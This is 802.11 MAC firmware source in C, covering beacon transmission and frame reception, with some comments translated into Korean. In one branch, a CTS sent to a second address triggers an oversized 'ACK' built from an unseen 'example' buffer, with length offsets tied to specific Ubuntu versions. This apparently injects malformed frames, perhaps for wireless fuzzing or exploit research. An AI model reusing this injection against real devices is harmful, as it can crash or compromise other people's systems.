	//  the first Tx occurs the DCF state machine will not start a backoff. The upper-level MAC should compare the num_slots value
	//  to the time delta between the accept and start times of the first transmission to determine whether the pre-Tx backoff
	//  actually occurred.
	low_tx_details.num_slots   = n_slots;
	low_tx_details.attempt_number = 1;

	 // Wait for the MPDU Tx to finish
	do { // while(tx_status & WLAN_MAC_STATUS_MASK_TX_C_PENDING)

		// Poll the DCF core status register
		mac_hw_status = wlan_mac_get_status();
		if( mac_hw_status & WLAN_MAC_STATUS_MASK_TX_PHY_ACTIVE && (tx_has_started == 0)){
			if((tx_frame_info->flags) & TX_FRAME_INFO_FLAGS_FILL_TIMESTAMP){
				// Insert the TX START timestamp
				*((u64*)(((u8*)header + 24))) = ((u64)wlan_mac_low_get_tx_start_timestamp())+T_TIMESTAMP_FIELD_OFFSET;
			}
			tx_has_started = 1;
		}


		if( mac_hw_status & WLAN_MAC_STATUS_MASK_TX_C_DONE ) {
			// Transmission is complete

			switch(tx_mode) {
			//TODO: Resetting the SSRC and/or SLRC needs to be checked back against the standard
				case TX_MODE_SHORT:
					reset_ssrc();
					reset_cw();
				break;
				case TX_MODE_LONG:
					reset_slrc();
					reset_cw();
				break;
			}

			low_tx_details.tx_start_timestamp_mpdu = wlan_mac_low_get_tx_start_timestamp();
			low_tx_details.tx_start_timestamp_frac_mpdu = wlan_mac_low_get_tx_start_timestamp_frac();

			// Start a post-Tx backoff using the updated contention window
			//  If MAC Tx controller A backoff has been paused this backoff request will
			//   successfully be ignored. If Tx A is idle then this backoff
			//   will execute and future submission to Tx A may inherit the
			//   this backoff.
			// TODO: We should double check whether post-Tx backoffs are appropriate
			n_slots = rand_num_slots(RAND_SLOT_REASON_STANDARD_ACCESS);
			wlan_mac_dcf_hw_start_backoff(n_slots);

		} else {
			// Poll the MAC Rx state to check if a packet was received while our Tx was deferring
			if (mac_hw_status & WLAN_MAC_STATUS_MASK_RX_PHY_STARTED) {
				gl_waiting_for_response = 0;
				rx_status = wlan_mac_low_poll_frame_rx();
				// Check if the new reception met the conditions to cancel the already-submitted transmission
				if (((rx_status & FRAME_RX_RET_CANCEL_TX) != 0)) {
					// The Rx handler halted this transmission already by resetting the MAC core
					// Our return_status should still be considered a success -- we successfully did not
					// transmit the beacon. This will tell the TBTT logic to move on to the next beacon interval
					// before attempting another beacon transmission.

					// We will not sent a BEACON_DONE IPC message to CPU_HIGH, so
					// tx_frame_info->tx_pkt_buf_state should remain READY
					tx_frame_info->tx_pkt_buf_state = TX_PKT_BUF_READY;
					if(unlock_tx_pkt_buf(tx_pkt_buf) != PKT_BUF_MUTEX_SUCCESS){
						xil_printf("Error: Unable to unlock Beacon packet buffer (beacon cancel)\n");
					}
					return_status |= SEND_BEACON_RETURN_CANCELLED;
					return return_status;
				}

			} else {
				// Poll IPC rx
				// TODO: Need to handle implications of an IPC message changing something like channel
				wlan_mac_low_poll_ipc_rx();
			}
		} // END if(Tx A state machine done)
	} while( mac_hw_status & WLAN_MAC_STATUS_MASK_TX_C_PENDING );

	tx_frame_info->tx_pkt_buf_state = TX_PKT_BUF_DONE;
	if(unlock_tx_pkt_buf(tx_pkt_buf) != PKT_BUF_MUTEX_SUCCESS) {
		xil_printf("Error: Unable to unlock Beacon packet buffer (beacon sent) %d\n", unlock_tx_pkt_buf(tx_pkt_buf));
	}
	ipc_msg_to_high.msg_id            = IPC_MBOX_MSG_ID(IPC_MBOX_TX_BEACON_DONE);
	ipc_msg_to_high.num_payload_words = sizeof(wlan_mac_low_tx_details_t)/sizeof(u32);
	ipc_msg_to_high.arg0              = tx_pkt_buf;
	ipc_msg_to_high.payload_ptr       = (u32*)&low_tx_details;
	write_mailbox_msg(&ipc_msg_to_high);

	//Enough time has passed in the transmission of this beacon that we should see if any new MPDUs
	//are ready to send. This is particularly important for multicast packets that may need to be sent
	//immediately folling a DTIM
	wlan_mac_low_poll_ipc_rx();

	return return_status;
}

/*****************************************************************************/
/**
 * @brief Handles reception of a wireless packet
 *
 * This function is called after a good SIGNAL field is detected by either PHY (OFDM or DSSS)
 *
 * It is the responsibility of this function to wait until a sufficient number of bytes have been received
 * before it can start to process those bytes. When this function is called the eventual checksum status is
 * unknown. The packet contents can be provisionally processed (e.g. prepare an ACK for fast transmission),
 * but post-reception actions must be conditioned on the eventual FCS status (good or bad).
 * 이 바이트의 처리를 시작하기 전에 충분한 수의 바이트가 수신 될 때까지 대기하는 것은 이 함수의 책임입니다.
 * 이 함수를 호출하면 최종 체크섬 상태를 알 수 없습니다.
 * 패킷 내용은 잠정적으로 처리 될 수 있지만 (예를 들어, 빠른 전송을 위해 ACK를 준비), 수신 후 동작 동작은 최종 FCS 상태 (양호 또는 불량)에 따른 조건되어야한다.
 *
 *
 * NOTE: The timing of this function is critical for correct operation of the 802.11 DCF. It is not
 *     safe to add large delays to this function (e.g. xil_printf or wlan_usleep)
 *
 * Two primary job responsibilities of this function:
 *  (1): Prepare outgoing ACK packets and instruct the MAC_DCF_HW core whether or not to send ACKs
 *  나가는 ACK 패킷을 준비하고 ACK를 보낼지 여부를 MAC_DCF_HW 코어에 지시합니다
 *  (2): Pass up MPDUs (FCS valid or invalid) to CPU_HIGH
 *  CPU_HIGH에 MPDU (FCS 유효 또는 무효)를 전달합니다.
 *
 *
 * @param   rx_pkt_buf       - Index of the Rx packet buffer containing the newly received packet
 * @param   phy_details      - Pointer to phy_rx_details struct containing PHY mode, MCS, and Length
 * @return  u32              - Bit mask of flags indicating various results of the reception
 * 다양한 수신 결과를 나타내는 플래그의 비트 마스크
 *
 */
u32 frame_receive(u8 rx_pkt_buf, phy_rx_details_t* phy_details) {

    // RX_LEN_THRESH is used to manage a potential pipeline bubble that can be used during a reception
	// 	RX_LEN_THRESH는 수신 중에 사용할 수있는 잠재적 인 파이프 라인 버블을 관리하는 데 사용됩니다
    // for processing:
    //   - If the ongoing reception is >RX_LEN_THRESH, we will start
    //     processing the frame and filling in metadata into the packet
    //     buffer prior to calling wlan_mac_hw_rx_finish().
	//     진행중인 수신이 RX_LEN_THRESH 보다 큰 경우, wlan_mac_hw_rx_finish ()를 호출하기 전에 프레임 처리와 메타 데이터를 패킷 버퍼에 채우기 시작합니다.
	//
    //   - If the ongoing reception is <RX_LEN_THRESH, we'll immediately
    //     start polling the PHY with wlan_mac_hw_rx_finish() and,
    //     if need be, configure a MAC Tx core to send a response.
	//     진행중인 수신이 RX_LEN_THRESH 보다 작은 경우, 우리는 즉시 wlan_mac_hw_rx_finish ()로 PHY 폴링을 시작하고, 필요하다면 MAC Tx 코어가 응답을 보내도록 구성합니다.
    //
    // This structure handles any risk of response packets (e.g. an ACK) not being configured in time
    // for the hard SIFS boundary.
    // 이 구조는 하드 SIFS 경계에 대해 시간상에 구성되지 않은 응답 패킷 (예 : ACK)의 위험을 처리합니다.

	int					i;
    u32                 return_value             = 0;
    u32                 tx_length;
    u8                  tx_mcs;
    u16                 cts_duration;
    u8                  unicast_to_me, to_multicast, unicast_to_me_1;
    u16                 rssi;
    u8                  lna_gain;
    u8                  active_rx_ant;
    u32                 rx_filter;
    u8                  report_to_mac_high;
    int                 curr_tx_pow;
    u8                  ctrl_tx_gain;
    u32                 mac_tx_ctrl_status;
    s64					time_delta;

    u8                  mpdu_tx_ant_mask         = 0;
    u8                  ack_tx_ant               = 0;
    u8                  tx_ant_mask              = 0;
    u8                  num_resp_failures        = 0;

    rx_finish_state_t   rx_finish_state     = RX_FINISH_SEND_NONE;
    tx_pending_state_t  tx_pending_state    = TX_PENDING_NONE;

    rx_frame_info_t   * rx_frame_info;
    tx_frame_info_t   * tx_frame_info;
    mac_header_80211  * rx_header;
    u8				  * mac_payload_ptr_u8;

    // Translate Rx pkt buf index into actual memory address
    void* pkt_buf_addr = (void *) RX_PKT_BUF_TO_ADDR(rx_pkt_buf);

    // Get pointer to MPDU info struct (stored at 0 offset in the pkt buffer)
    rx_frame_info = (rx_frame_info_t*) pkt_buf_addr;

    // Clear the MPDU info flags
    rx_frame_info->flags = 0;

    // Apply the mac_header_80211 template to the first bytes of the received MPDU
    rx_header = (mac_header_80211*)((void*)(pkt_buf_addr + PHY_RX_PKT_BUF_MPDU_OFFSET));
    mac_payload_ptr_u8 = (u8*)rx_header;

    // Sanity check length value - anything shorter than an ACK must be bogus
    if((phy_details->length) < (sizeof(mac_header_80211_ACK) + WLAN_PHY_FCS_NBYTES)) {
        return return_value;
    }

    // Translate the rate index into the rate code used by the Tx PHY
    //     This translation is required in case this reception needs to send an ACK, as the ACK
    //     rate is a function of the rate of the received packet
    //     The mapping of Rx rate to ACK rate is given in 9.7.6.5.2 of 802.11-2012
    //
    tx_mcs      = wlan_mac_low_mcs_to_ctrl_resp_mcs(phy_details->mcs, phy_details->phy_mode);

    // Determine which antenna the ACK will be sent from
    //     The current implementation transmits ACKs from the same antenna over which the previous packet was received
    //
    active_rx_ant = (wlan_phy_rx_get_active_rx_ant());
    tx_ant_mask   = 0;

    switch(active_rx_ant){
        case RX_ACTIVE_ANTA:  tx_ant_mask |= 0x1;  break;
//        case RX_ACTIVE_ANTB:  tx_ant_mask |= 0x2;  break;
        case RX_ACTIVE_ANTB:  tx_ant_mask |= 0x1;  break;
        case RX_ACTIVE_ANTC:  tx_ant_mask |= 0x4;  break;
        case RX_ACTIVE_ANTD:  tx_ant_mask |= 0x8;  break;
        default:              tx_ant_mask  = 0x1;  break;            // Default to RF_A
    }

    // Wait until the PHY has written enough bytes so that the first address field can be processed
    i = 0;
    while(wlan_mac_get_last_byte_index() < MAC_HW_LASTBYTE_ADDR1) {
    	if(i++ > 1000000) {
    		xil_printf("Stuck waiting for MAC_HW_LASTBYTE_ADDR1: wlan_mac_get_last_byte_index() = %d\n", wlan_mac_get_last_byte_index());
			xil_printf(" MAC HW Status: 0x%08x\n", wlan_mac_get_status());
			xil_printf(" Rx Hdr Params: 0x%08x\n", wlan_mac_get_rx_phy_hdr_params());
			xil_printf(" Rx PHY Status: 0x%08x\n", Xil_In32(WLAN_RX_STATUS));
    	}
    };

    // Check the destination address
    unicast_to_me = wlan_addr_eq(rx_header->address_1, gl_eeprom_addr);
    unicast_to_me_1 = wlan_addr_eq(rx_header->address_1, v_sta);
    to_multicast  = wlan_addr_mcast(rx_header->address_1);

    // Prep outgoing ACK just in case it needs to be sent
    //     ACKs are only sent for non-control frames addressed to this node
    if(unicast_to_me && !WLAN_IS_CTRL_FRAME(rx_header)) {
        // Auto TX Delay is in units of 100ns. This delay runs from RXEND of the preceding reception.
        //     wlan_mac_tx_ctrl_B_params(pktBuf, antMask, req_zeroNAV, preWait_postRxTimer1, preWait_postRxTimer2, preWait_postTxTimer1, phy_mode)
        wlan_mac_tx_ctrl_B_params(TX_PKT_BUF_ACK_CTS, tx_ant_mask, 0, 1, 0, 0, PHY_MODE_NONHT);

        // ACKs are transmitted with a nominal Tx power used for all control packets
        ctrl_tx_gain = wlan_mac_low_dbm_to_gain_target(wlan_mac_low_get_current_ctrl_tx_pow());
        wlan_mac_tx_ctrl_B_gains(ctrl_tx_gain, ctrl_tx_gain, ctrl_tx_gain, ctrl_tx_gain);


        if((phy_details->length) >= MAC_HW_LASTBYTE_ADDR2){
        	// Wait until the PHY has written enough bytes so that the second address field can be processed
        	// 두 번째 주소 필드를 처리 할 수 ​​있도록 PHY에 충분한 바이트가 기록 될 때까지 기다립니다.
        	// If this is a short reception that does not have a second address, it is still possible to get
        	// to this line of code if there is an FCS error and the WLAN_IS_CTRL_FRAME check above fails.
        	// 두 번째 주소가없는 짧은 수신 인 경우 FCS 오류가 있고 위의 WLAN_IS_CTRL_FRAME 검사가 실패하면이 코드 줄에 계속 도달 할 수 있습니다.
        	// As such, we sanity check the length of the reception before getting into a potentially infinite
        	// loop.
        	// 따라서 잠재적 인 무한 루프에 빠지기 전에 리셉션의 길이를 점검해야합니다.

        	i = 0;
        	while(wlan_mac_get_last_byte_index() < MAC_HW_LASTBYTE_ADDR2) {
        		if(i++ > 1000000) {
        			xil_printf("Stuck waiting for MAC_HW_LASTBYTE_ADDR2: wlan_mac_get_last_byte_index() = %d\n", wlan_mac_get_last_byte_index());
        			xil_printf(" MAC HW Status: 0x%08x\n", wlan_mac_get_status());
        			xil_printf(" Rx Hdr Params: 0x%08x\n", wlan_mac_get_rx_phy_hdr_params());
        			xil_printf(" Rx PHY Status: 0x%08x\n", Xil_In32(WLAN_RX_STATUS));
        		}
			};
        }

        // Construct the ACK frame in the dedicated Tx pkt buf
        tx_length = wlan_create_ack_frame((void*)(TX_PKT_BUF_TO_ADDR(TX_PKT_BUF_ACK_CTS) + PHY_TX_PKT_BUF_MPDU_OFFSET), rx_header->address_2);

        // Write the SIGNAL field for the ACK
        write_phy_preamble(TX_PKT_BUF_ACK_CTS, PHY_MODE_NONHT, tx_mcs, tx_length);

        rx_finish_state = RX_FINISH_SEND_B;

        rx_frame_info->resp_low_tx_details.tx_details_type      = TX_DETAILS_ACK;
        rx_frame_info->resp_low_tx_details.phy_params_ctrl.mcs  = tx_mcs;

        // We let "duration" be equal to the duration field of an ACK. This value is provided explicitly to CPU_HIGH
        // in the low_tx_details struct such that CPU_HIGH has can reconstruct the RTS in its log. This isn't critical
        // to the operation of the DCF, but is critical for the logging framework.
        //
        rx_frame_info->resp_low_tx_details.duration = 0;

        // This element remains unused during MPDU-only transmissions
        rx_frame_info->resp_low_tx_details.phy_params_ctrl.phy_mode     = PHY_MODE_NONHT;
        rx_frame_info->resp_low_tx_details.phy_params_ctrl.power        = wlan_mac_low_get_current_ctrl_tx_pow();

        switch(tx_ant_mask) {
            case 0x1:  ack_tx_ant = TX_ANTMODE_SISO_ANTA; break;
            case 0x2:  ack_tx_ant = TX_ANTMODE_SISO_ANTB; break;
            case 0x4:  ack_tx_ant = TX_ANTMODE_SISO_ANTC; break;
            case 0x8:  ack_tx_ant = TX_ANTMODE_SISO_ANTD; break;
            default:   ack_tx_ant = TX_ANTMODE_SISO_ANTA; break;   // Default to RF_A
        }

        rx_frame_info->resp_low_tx_details.phy_params_ctrl.antenna_mode = ack_tx_ant;
    } else if(unicast_to_me_1 && (rx_header->frame_control_1 == MAC_FRAME_CTRL1_SUBTYPE_CTS)){
//    } else if(unicast_to_me && (rx_header->frame_control_1 == MAC_FRAME_CTRL1_SUBTYPE_CTS)){
//        if(gl_long_mpdu_pkt_buf != PKT_BUF_INVALID) {
            // We have an outgoing data frame we should send
            //     - Configure the Tx antenna selection
            //     - The frame_transmit() context already configured the SIGNAL field,
            //       so we do not have to worry about it in this context
            //
//        	tx_frame_info = (tx_frame_info_t*) (TX_PKT_BUF_TO_ADDR(gl_long_mpdu_pkt_buf));

//            switch(tx_frame_info->params.phy.antenna_mode) {
//                case TX_ANTMODE_SISO_ANTA:  mpdu_tx_ant_mask |= 0x1;  break;
//                case TX_ANTMODE_SISO_ANTB:  mpdu_tx_ant_mask |= 0x2;  break;
//                case TX_ANTMODE_SISO_ANTC:  mpdu_tx_ant_mask |= 0x4;  break;
//                case TX_ANTMODE_SISO_ANTD:  mpdu_tx_ant_mask |= 0x8;  break;
//                default:                    mpdu_tx_ant_mask  = 0x1;  break;   // Default to RF_A
//            }
//
            // Configure the Tx power - update all antennas, even though only one will be used
//            curr_tx_pow = wlan_mac_low_dbm_to_gain_target(tx_frame_info->params.phy.power);
//            wlan_mac_tx_ctrl_A_gains(curr_tx_pow, curr_tx_pow, curr_tx_pow, curr_tx_pow);
//            wlan_mac_tx_ctrl_A_params(gl_long_mpdu_pkt_buf, mpdu_tx_ant_mask, 0, 1, 0, 1, tx_frame_info->params.phy.phy_mode); //Use postRx timer 1 and postTx_timer2

//            rx_finish_state = RX_FINISH_SEND_A;

//            return_value |= FRAME_RX_RET_TYPE_CTS;
//        } else {
            //Unexpected CTS to me.
        	//This clause can execute on a bad FCS (e.g. it's actually a bad FCS ACK)
//        }
    	// Auto TX Delay is in units of 100ns. This delay runs from RXEND of the preceding reception.
    	        //     wlan_mac_tx_ctrl_B_params(pktBuf, antMask, req_zeroNAV, preWait_postRxTimer1, preWait_postRxTimer2, preWait_postTxTimer1, phy_mode)
    	        wlan_mac_tx_ctrl_B_params(TX_PKT_BUF_ACK_CTS, tx_ant_mask, 0, 1, 0, 0, PHY_MODE_NONHT);

    	        // ACKs are transmitted with a nominal Tx power used for all control packets
    	        ctrl_tx_gain = wlan_mac_low_dbm_to_gain_target(wlan_mac_low_get_current_ctrl_tx_pow());
    	        wlan_mac_tx_ctrl_B_gains(ctrl_tx_gain, ctrl_tx_gain, ctrl_tx_gain, ctrl_tx_gain);


    	        if((phy_details->length) >= MAC_HW_LASTBYTE_ADDR2){
    	        	// Wait until the PHY has written enough bytes so that the second address field can be processed
    	        	// 두 번째 주소 필드를 처리 할 수 ​​있도록 PHY에 충분한 바이트가 기록 될 때까지 기다립니다.
    	        	// If this is a short reception that does not have a second address, it is still possible to get
    	        	// to this line of code if there is an FCS error and the WLAN_IS_CTRL_FRAME check above fails.
    	        	// 두 번째 주소가없는 짧은 수신 인 경우 FCS 오류가 있고 위의 WLAN_IS_CTRL_FRAME 검사가 실패하면이 코드 줄에 계속 도달 할 수 있습니다.
    	        	// As such, we sanity check the length of the reception before getting into a potentially infinite
    	        	// loop.
    	        	// 따라서 잠재적 인 무한 루프에 빠지기 전에 리셉션의 길이를 점검해야합니다.

    	        	i = 0;
    	        	while(wlan_mac_get_last_byte_index() < MAC_HW_LASTBYTE_ADDR2) {
    	        		if(i++ > 1000000) {
    	        			xil_printf("Stuck waiting for MAC_HW_LASTBYTE_ADDR2: wlan_mac_get_last_byte_index() = %d\n", wlan_mac_get_last_byte_index());
    	        			xil_printf(" MAC HW Status: 0x%08x\n", wlan_mac_get_status());
    	        			xil_printf(" Rx Hdr Params: 0x%08x\n", wlan_mac_get_rx_phy_hdr_params());
    	        			xil_printf(" Rx PHY Status: 0x%08x\n", Xil_In32(WLAN_RX_STATUS));
    	        		}
    				};
    	        }

    	        // Construct the ACK frame in the dedicated Tx pkt buf
//    	        tx_length = wlan_create_ack_frame((void*)(TX_PKT_BUF_TO_ADDR(TX_PKT_BUF_ACK_CTS) + PHY_TX_PKT_BUF_MPDU_OFFSET), rx_header->address_2);
//    	        tx_length = wlan_create_ack_frame((void*)(TX_PKT_BUF_TO_ADDR(TX_PKT_BUF_ACK_CTS) + PHY_TX_PKT_BUF_MPDU_OFFSET), (u8 *) example) + 663;
    	        //tx_length = wlan_create_ack_frame((void*)(TX_PKT_BUF_TO_ADDR(TX_PKT_BUF_ACK_CTS) + PHY_TX_PKT_BUF_MPDU_OFFSET), (u8 *) example) + 663 + 863;
    	        //tx_length = wlan_create_ack_frame((void*)(TX_PKT_BUF_TO_ADDR(TX_PKT_BUF_ACK_CTS) + PHY_TX_PKT_BUF_MPDU_OFFSET), (u8 *) example) + 473;
    	        // tx_length = wlan_create_ack_frame((void*)(TX_PKT_BUF_TO_ADDR(TX_PKT_BUF_ACK_CTS) + PHY_TX_PKT_BUF_MPDU_OFFSET), (u8 *) example) + 219; // ubuntu 14.04
    	        tx_length = wlan_create_ack_frame((void*)(TX_PKT_BUF_TO_ADDR(TX_PKT_BUF_ACK_CTS) + PHY_TX_PKT_BUF_MPDU_OFFSET), (u8 *) example) + 248; // ubuntu 20.04



    	        // Write the SIGNAL field for the ACK
    	        write_phy_preamble(TX_PKT_BUF_ACK_CTS, PHY_MODE_NONHT, tx_mcs, tx_length);

    	        rx_finish_state = RX_FINISH_SEND_B;

    	        rx_frame_info->resp_low_tx_details.tx_details_type      = TX_DETAILS_ACK;
    	        rx_frame_info->resp_low_tx_details.phy_params_ctrl.mcs  = tx_mcs;

    	        // We let "duration" be equal to the duration field of an ACK. This value is provided explicitly to CPU_HIGH
    	        // in the low_tx_details struct such that CPU_HIGH has can reconstruct the RTS in its log. This isn't critical
    	        // to the operation of the DCF, but is critical for the logging framework.
    	        //
    	        rx_frame_info->resp_low_tx_details.duration = 0;

    	        // This element remains unused during MPDU-only transmissions
    	        rx_frame_info->resp_low_tx_details.phy_params_ctrl.phy_mode     = PHY_MODE_NONHT;
    	        rx_frame_info->resp_low_tx_details.phy_params_ctrl.power        = wlan_mac_low_get_current_ctrl_tx_pow();

    	        switch(tx_ant_mask) {
    	            case 0x1:  ack_tx_ant = TX_ANTMODE_SISO_ANTA; break;
    	            case 0x2:  ack_tx_ant = TX_ANTMODE_SISO_ANTB; break;
    	            case 0x4:  ack_tx_ant = TX_ANTMODE_SISO_ANTC; break;
    	            case 0x8:  ack_tx_ant = TX_ANTMODE_SISO_ANTD; break;
    	            default:   ack_tx_ant = TX_ANTMODE_SISO_ANTA; break;   // Default to RF_A
    	        }

    	        rx_frame_info->resp_low_tx_details.phy_params_ctrl.antenna_mode = ack_tx_ant;

    } else if(unicast_to_me && (rx_header->frame_control_1 == MAC_FRAME_CTRL1_SUBTYPE_RTS)){
        // We need to send a CTS
        //     Auto TX Delay is in units of 100ns. This delay runs from RXEND of the preceding reception.
        //     wlan_mac_tx_ctrl_B_params(pktBuf, antMask, req_zeroNAV, preWait_postRxTimer1, preWait_postRxTimer2, preWait_postTxTimer1, phy_mode)
        //
        wlan_mac_tx_ctrl_B_params(TX_PKT_BUF_ACK_CTS, tx_ant_mask, 1, 1, 0, 0, PHY_MODE_NONHT);

        // CTSs are transmitted with a nominal Tx power used for all control packets
        ctrl_tx_gain = wlan_mac_low_dbm_to_gain_target(wlan_mac_low_get_current_ctrl_tx_pow());
        wlan_mac_tx_ctrl_B_gains(ctrl_tx_gain, ctrl_tx_gain, ctrl_tx_gain, ctrl_tx_gain);

        cts_duration = sat_sub(rx_header->duration_id, (gl_mac_timing_values.t_sifs) +
        			wlan_ofdm_calc_txtime(sizeof(mac_header_80211_CTS) + WLAN_PHY_FCS_NBYTES, tx_mcs, PHY_MODE_NONHT, wlan_mac_low_get_phy_samp_rate()));

        // Construct the ACK frame in the dedicated Tx pkt buf
        tx_length = wlan_create_cts_frame((void*)(TX_PKT_BUF_TO_ADDR(TX_PKT_BUF_ACK_CTS) + PHY_TX_PKT_BUF_MPDU_OFFSET),
                                          rx_header->address_2,
                                          cts_duration);

        // Write the SIGNAL field for the CTS
        write_phy_preamble(TX_PKT_BUF_ACK_CTS, PHY_MODE_NONHT, tx_mcs, tx_length);

        rx_finish_state = RX_FINISH_SEND_B;

        rx_frame_info->resp_low_tx_details.tx_details_type     = TX_DETAILS_CTS;
        rx_frame_info->resp_low_tx_details.phy_params_ctrl.mcs = tx_mcs;

        // We let "duration" be equal to the duration field of an CTS. This value is provided explicitly to CPU_HIGH
        // in the low_tx_details struct such that CPU_HIGH has can reconstruct the RTS in its log. This isn't critical
        // to the operation of the DCF, but is critical for the logging framework.
        rx_frame_info->resp_low_tx_details.duration = cts_duration;

        // This element remains unused during MPDU-only transmissions
        rx_frame_info->resp_low_tx_details.phy_params_ctrl.phy_mode     = PHY_MODE_NONHT;
        rx_frame_info->resp_low_tx_details.phy_params_ctrl.power        = wlan_mac_low_get_current_ctrl_tx_pow();

        switch(tx_ant_mask) {
            case 0x1:  ack_tx_ant = TX_ANTMODE_SISO_ANTA; break;
            case 0x2:  ack_tx_ant = TX_ANTMODE_SISO_ANTB; break;
            case 0x4:  ack_tx_ant = TX_ANTMODE_SISO_ANTC; break;
            case 0x8:  ack_tx_ant = TX_ANTMODE_SISO_ANTD; break;
            default:   ack_tx_ant = TX_ANTMODE_SISO_ANTA; break;   // Default to RF_A
        }

        rx_frame_info->resp_low_tx_details.phy_params_ctrl.antenna_mode = ack_tx_ant;

    }

    // Based on the RX length threshold, determine processing order
    if((phy_details->length) <= RX_LEN_THRESH) {
    	if(wlan_mac_hw_rx_finish() == 1){
    		//FCS was good
    		rx_frame_info->flags |= RX_FRAME_INFO_FLAGS_FCS_GOOD;
    	} else {
    		//FCS was bad
    		rx_frame_info->flags &= ~RX_FRAME_INFO_FLAGS_FCS_GOOD;
    	}

        if(rx_frame_info->flags & RX_FRAME_INFO_FLAGS_FCS_GOOD){
            switch(rx_finish_state) {
                case RX_FINISH_SEND_A:
                    wlan_mac_tx_ctrl_A_start(1);
                    wlan_mac_tx_ctrl_A_start(0);
                    tx_pending_state = TX_PENDING_A;
                break;

                case RX_FINISH_SEND_B:
                    wlan_mac_tx_ctrl_B_start(1);
                    wlan_mac_tx_ctrl_B_start(0);
                    tx_pending_state = TX_PENDING_B;
                break;

                default:
                case RX_FINISH_SEND_NONE:
                    // Do nothing
                break;
            }
        }
        rx_finish_state = RX_FINISH_SEND_NONE;
    }

    // Check if this reception is an ACK
    //TODO: we could add a unicast to me check here. It should be redundant. Then again, the POLL_MAC_TYPE_CTS does have the unicast requirement
    if((rx_header->frame_control_1) == MAC_FRAME_CTRL1_SUBTYPE_ACK){
        return_value |= FRAME_RX_RET_TYPE_ACK;
    }

    // Update metadata about this reception
    rx_frame_info->phy_details = *phy_details;

    // This reception was a re-transmission by the other node
    if ((rx_header->frame_control_2) & MAC_FRAME_CTRL2_FLAG_RETRY) {
    	rx_frame_info->flags |= RX_FRAME_INFO_FLAGS_RETRY;
    }

    // Record information about the reception in the RX packet metadata
    rx_frame_info->channel        = wlan_mac_low_get_active_channel();
    rx_frame_info->phy_samp_rate  = (u8)wlan_mac_low_get_phy_samp_rate();
    rx_frame_info->timestamp      = wlan_mac_low_get_rx_start_timestamp();
    rx_frame_info->timestamp_frac = wlan_mac_low_get_rx_start_timestamp_frac();
    rx_frame_info->ant_mode       = active_rx_ant;
    rx_frame_info->cfo_est		  = wlan_phy_rx_get_cfo_est();
    rx_frame_info->rf_gain        = wlan_phy_rx_get_agc_RFG(active_rx_ant);
    rx_frame_info->bb_gain        = wlan_phy_rx_get_agc_BBG(active_rx_ant);

    lna_gain                  = wlan_phy_rx_get_agc_RFG(active_rx_ant);
    rssi                      = wlan_phy_rx_get_pkt_rssi(active_rx_ant);
    rx_frame_info->rx_power   = wlan_mac_low_calculate_rx_power(rssi, lna_gain);

    // Block until the reception is complete, storing the checksum status in the frame_info struct
    if ((phy_details->length) > RX_LEN_THRESH) {
    	if(wlan_mac_hw_rx_finish() == 1){
    		//FCS was good
    		rx_frame_info->flags |= RX_FRAME_INFO_FLAGS_FCS_GOOD;
    	} else {
    		//FCS was bad
    		rx_frame_info->flags &= ~RX_FRAME_INFO_FLAGS_FCS_GOOD;
    	}
    }

    // Received packet had good checksum
    if(rx_frame_info->flags & RX_FRAME_INFO_FLAGS_FCS_GOOD) {
    	if(unicast_to_me &&
    			(gl_waiting_for_response == 0) &&
    			( (return_value & FRAME_RX_RET_TYPE_CTS) || (return_value & FRAME_RX_RET_TYPE_ACK) )){
    		rx_frame_info->flags |= RX_FRAME_INFO_UNEXPECTED_RESPONSE;
    	} else {
    		rx_frame_info->flags &= ~RX_FRAME_INFO_UNEXPECTED_RESPONSE;
    	}


        // Increment green LEDs
        gl_green_led_index = (gl_green_led_index + 1) % NUM_LEDS;
        userio_write_leds_green(USERIO_BASEADDR, (1<<gl_green_led_index));

        return_value |= FRAME_RX_RET_STATUS_GOOD;

        // Check if this packet should be passed up to CPU High for further processing
        rx_filter = wlan_mac_low_get_current_rx_filter();

        switch (rx_filter & RX_FILTER_HDR_MASK) {
            default:
            case RX_FILTER_HDR_ADDR_MATCH_MPDU:
                // Non-control packet either addressed to me or addressed to multicast address
                report_to_mac_high = (unicast_to_me || to_multicast) && !WLAN_IS_CTRL_FRAME(rx_header);
            break;
            case RX_FILTER_HDR_ALL_MPDU:
                // Any non-control packet
                report_to_mac_high = !WLAN_IS_CTRL_FRAME(rx_header);
            break;
            case RX_FILTER_HDR_ALL:
                // All packets (data, management and control; no type or address filtering)
                report_to_mac_high = 1;
            break;
        }

        // Sanity check packet length - if the header says non-control but the length is shorter than a full MAC header
        // it must be invalid; this should never happen, but better to catch rare events here than corrupt state in CPU High
        if (!WLAN_IS_CTRL_FRAME(rx_header) && (phy_details->length < sizeof(mac_header_80211))) {
            report_to_mac_high = 0;
        }

        if(unicast_to_me) {
            return_value |= FRAME_RX_RET_ADDR_MATCH;
        }

        if ((phy_details->length) > RX_LEN_THRESH) {
            switch (rx_finish_state) {
                case RX_FINISH_SEND_A:
                    wlan_mac_tx_ctrl_A_start(1);
                    wlan_mac_tx_ctrl_A_start(0);
                    tx_pending_state = TX_PENDING_A;
                break;

                case RX_FINISH_SEND_B:
                    wlan_mac_tx_ctrl_B_start(1);
                    wlan_mac_tx_ctrl_B_start(0);
                    tx_pending_state = TX_PENDING_B;
                break;

                default:
                case RX_FINISH_SEND_NONE:
                break;
            }
        }


		// Check to see if this was a beacon and update the MAC time if appropriate
		if(rx_header->frame_control_1 == MAC_FRAME_CTRL1_SUBTYPE_BEACON) {
			
			// If this packet was from our BSS
			if(wlan_addr_eq(gl_beacon_txrx_configure.bssid_match, rx_header->address_3)){

				if(gl_beacon_txrx_configure.beacon_tx_mode == IBSS_BEACON_TX){
					// Reset all state in the DCF core - this cancels deferrals and pending transmissions
					wlan_mac_reset_tx_ctrl_C(1);
					wlan_mac_reset_tx_ctrl_C(0);
					return_value |= FRAME_RX_RET_CANCEL_TX;
				}

				// Move the packet pointer to after the header
				mac_payload_ptr_u8 += sizeof(mac_header_80211);

				// Calculate the difference between the beacon timestamp and the packet timestamp
				time_delta = (s64)(((beacon_probe_frame*)mac_payload_ptr_u8)->timestamp) - (s64)(rx_frame_info->timestamp) + gl_mac_timing_values.t_phy_rx_start_dly - T_TIMESTAMP_FIELD_OFFSET;

				// Update the MAC time
				switch(gl_beacon_txrx_configure.ts_update_mode){
					// TODO: notify the MAC Low Framework of this change so that TBTT can be updated (if necessary)
					case NEVER_UPDATE:
					break;
					case ALWAYS_UPDATE:
						apply_mac_time_delta_usec(time_delta);
						handle_mactime_change(time_delta); 																
					break;
					case FUTURE_ONLY_UPDATE:
